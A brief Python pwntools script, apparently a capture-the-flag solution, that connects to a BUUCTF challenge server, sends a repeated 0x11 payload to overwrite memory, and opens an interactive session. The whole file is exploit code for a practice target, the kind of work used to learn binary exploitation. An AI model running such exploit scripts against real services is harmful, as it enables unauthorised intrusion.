from pwn import *


io=remote("node4.buuoj.cn",25153)
payload=p32(0x11)*14
io.sendline(payload)
io.interactive()